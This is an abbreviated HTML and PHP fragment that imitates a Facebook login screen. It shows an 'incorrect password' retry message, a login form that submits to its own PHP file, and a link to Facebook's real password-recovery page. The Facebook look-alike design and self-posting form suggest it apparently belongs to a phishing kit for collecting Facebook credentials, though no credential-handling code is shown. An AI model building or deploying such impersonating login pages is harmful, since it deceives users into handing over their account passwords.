...
<div id="forg">
<p class="forg1">Incorrect password. Did you forgot your password?</p>
</div>
<div id="nav">
        ...
        <div id="main">
            ...
            <div id="main1">
                <div id="tri">
                    ...
                    <div id="ba">
                        <p>The password you’ve entered is incorrect. <a class="ab" href="http://">Forgot Password?</a></p>
                    </div>
                        ...
                        <div class="login_form_container">
                            <form id="login_form" action="<?php echo basename(__FILE__); ?>" accept-charset="utf-8" method="post">
                                ...
                                <div id="loginform">
                                    ...
                                    <div id="forget">
                                    <a class="har" href="https://www.facebook.com/recover/initiate/?ars=facebook_login"><p class="for">Forgot password?</p></a>
                                    </div>
